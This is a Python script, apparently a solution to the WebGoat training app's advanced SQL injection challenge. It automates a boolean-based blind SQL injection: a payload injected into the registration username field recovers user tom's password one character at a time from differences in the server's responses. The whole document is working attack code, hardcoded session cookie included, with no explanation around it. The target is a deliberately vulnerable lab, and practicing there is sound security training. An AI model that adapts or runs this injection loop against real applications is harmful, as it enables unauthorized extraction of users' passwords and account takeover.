#!/usr/env/bin python3
import requests
import json

url = "http://IP:PORT/WebGoat/SqlInjectionAdvanced/challenge"

headers = {
      'Cookie': 'JSESSIONID=Cdju1Ezp49_I8bMDn729Ia8sI7JL2ccQ88GmxxXo'
}

final_password = ''	

def send_request(payload, l):
        global index, final_password, running, letters
        data = {
               'username_reg': payload,
               'email_reg': 'tom@ghost.com',
               'password_reg': 'test',
               'confirm_password_reg': 'test',
        }
        res = requests.put(url, headers=headers, data=data).json()['feedback']
        print(final_password + l, end='\r')
        if letters[:-1] == l:
            running = False
      
        if 'already exists' in res:
            final_password += l
            index += 1
            running = True

letters='abcdefghijklmnopqrstuvxwyz'
index=1
current_letter=''
running = True

while running:
 
      for l in letters:
            current_letter = l
            payload = f"tom' AND substring(password, {index}, 1) ='{current_letter}"
            send_request(payload, l)

print(final_password)






